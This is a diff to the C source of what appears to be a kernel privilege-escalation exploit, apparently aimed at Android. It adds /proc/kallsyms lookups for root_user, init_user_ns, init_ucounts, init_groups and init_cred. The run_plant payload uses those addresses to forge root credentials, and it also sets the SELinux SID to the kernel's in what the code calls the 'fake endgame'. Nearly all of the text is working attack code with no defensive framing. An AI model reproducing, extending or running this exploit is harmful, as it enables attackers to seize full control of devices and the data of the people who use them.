@@ -140,6 +140,11 @@ static unsigned long long g_tp_link, g_selinux_link;
 static unsigned long long g_root_user_link, g_init_user_ns_link;
 static unsigned long long g_init_ucounts_link, g_init_groups_link;
 static unsigned long long g_init_cred_link;
+/* Absolute addresses from /proc/kallsyms when the shell domain may read it.
+ * In that case the anchor tables are skipped, so the fake endgame has to take
+ * these objects from kallsyms instead of falling back to zero pointers. */
+static unsigned long long g_root_user_rt, g_init_user_ns_rt;
+static unsigned long long g_init_ucounts_rt, g_init_groups_rt, g_init_cred_rt;
 static int g_rel_mode;
 static unsigned long long g_slide;
 static unsigned long long g_rel_abs;
@@ -1467,10 +1472,24 @@ static void read_kallsyms(void)
             g_tp_runtime = a;
         else if (!strcmp(name, "selinux_state") && !g_selinux_runtime)
             g_selinux_runtime = a;
+        else if (!strcmp(name, "root_user") && !g_root_user_rt)
+            g_root_user_rt = a;
+        else if (!strcmp(name, "init_user_ns") && !g_init_user_ns_rt)
+            g_init_user_ns_rt = a;
+        else if (!strcmp(name, "init_ucounts") && !g_init_ucounts_rt)
+            g_init_ucounts_rt = a;
+        else if (!strcmp(name, "init_groups") && !g_init_groups_rt)
+            g_init_groups_rt = a;
+        else if (!strcmp(name, "init_cred") && !g_init_cred_rt)
+            g_init_cred_rt = a;
     }
     fclose(f);
     logf("[ksym] _text=%#llx tp_sys_exit=%#llx selinux_state=%#llx\n",
          g_text_runtime, g_tp_runtime, g_selinux_runtime);
+    if (g_init_user_ns_rt)
+        logf("[ksym] rt ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx\n",
+             g_root_user_rt, g_init_user_ns_rt, g_init_ucounts_rt,
+             g_init_groups_rt, g_init_cred_rt);
 }
 
 static int defeat_vr(unsigned long long task, unsigned char *raw)
@@ -1882,25 +1901,25 @@ static void run_plant(unsigned long long target, int tag, int mode,
             /* Prefer the external table's symbols (any build) over the
              * profile constants; the slide is already known here. */
             *(unsigned long long *)(payload + off + OFF_CRED_USER) =
-                (g_root_user_link
-                     ? g_root_user_link
-                     : (g_static_ok ? ROOT_USER_STATIC : 0)) +
-                g_slide;
+                g_root_user_rt ? g_root_user_rt
+                    : (g_root_user_link
+                           ? g_root_user_link + g_slide
+                           : (g_static_ok ? ROOT_USER_STATIC + g_slide : 0));
             *(unsigned long long *)(payload + off + OFF_CRED_USER_NS) =
-                (g_init_user_ns_link
-                     ? g_init_user_ns_link
-                     : (g_static_ok ? INIT_USER_NS_STATIC : 0)) +
-                g_slide;
+                g_init_user_ns_rt ? g_init_user_ns_rt
+                    : (g_init_user_ns_link
+                           ? g_init_user_ns_link + g_slide
+                           : (g_static_ok ? INIT_USER_NS_STATIC + g_slide : 0));
             *(unsigned long long *)(payload + off + OFF_CRED_UCOUNTS) =
-                (g_init_ucounts_link
-                     ? g_init_ucounts_link
-                     : (g_static_ok ? INIT_UCOUNTS_STATIC : 0)) +
-                g_slide;
+                g_init_ucounts_rt ? g_init_ucounts_rt
+                    : (g_init_ucounts_link
+                           ? g_init_ucounts_link + g_slide
+                           : (g_static_ok ? INIT_UCOUNTS_STATIC + g_slide : 0));
             *(unsigned long long *)(payload + off + OFF_CRED_GROUP_INFO) =
-                (g_init_groups_link
-                     ? g_init_groups_link
-                     : (g_static_ok ? INIT_GROUPS_STATIC : 0)) +
-                g_slide;
+                g_init_groups_rt ? g_init_groups_rt
+                    : (g_init_groups_link
+                           ? g_init_groups_link + g_slide
+                           : (g_static_ok ? INIT_GROUPS_STATIC + g_slide : 0));
             *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                 SELINUX_SID_KERNEL;
             *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
@@ -3192,9 +3211,12 @@ int main(int argc, char **argv)
 
             logf("[syms] %s -> %d (tp=%#llx selinux=%#llx)\n", sf, sn,
                  g_tp_link, g_selinux_link);
-            logf("[syms] have ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx\n",
+            logf("[syms] have ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx"
+                 " (rt ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx)\n",
                  g_root_user_link, g_init_user_ns_link, g_init_ucounts_link,
-                 g_init_groups_link, g_init_cred_link);
+                 g_init_groups_link, g_init_cred_link, g_root_user_rt,
+                 g_init_user_ns_rt, g_init_ucounts_rt, g_init_groups_rt,
+                 g_init_cred_rt);
         }
     }
 
@@ -3210,10 +3232,13 @@ int main(int argc, char **argv)
         read_build_id(bid, sizeof(bid));
         logf("[info] build=%s table=%s have_core=%d have_fake=%d\n",
              bid[0] ? bid : "?", g_anchor_table,
-             (g_tp_link && g_selinux_link) ? 1 : 0,
-             (g_root_user_link && g_init_user_ns_link &&
-              g_init_ucounts_link && g_init_groups_link &&
-              g_init_cred_link) ? 1 : 0);
+             ((g_tp_link && g_selinux_link) ||
+              (g_tp_runtime && g_selinux_runtime)) ? 1 : 0,
+             ((g_root_user_link && g_init_user_ns_link &&
+               g_init_ucounts_link && g_init_groups_link &&
+               g_init_cred_link) ||
+              (g_root_user_rt && g_init_user_ns_rt && g_init_ucounts_rt &&
+               g_init_groups_rt && g_init_cred_rt)) ? 1 : 0);
         return 0;
     }
 
@@ -3361,7 +3386,11 @@ int main(int argc, char **argv)
 
         if (!g_static_ok &&
             !(g_selinux_link && g_root_user_link && g_init_user_ns_link &&
-              g_init_ucounts_link && g_init_groups_link && g_tp_link))
+              g_init_ucounts_link && g_init_groups_link && g_tp_link) &&
+            !(g_root_user_rt && g_init_user_ns_rt && g_init_ucounts_rt &&
+              g_init_groups_rt && g_init_cred_rt &&
+              (g_tp_runtime || g_tp_link) &&
+              (g_selinux_runtime || g_selinux_link)))
         {
             /* The fake endgame needs the per-build selinux_state / init_*
              * / TP addresses.  Either the profile matches or an external
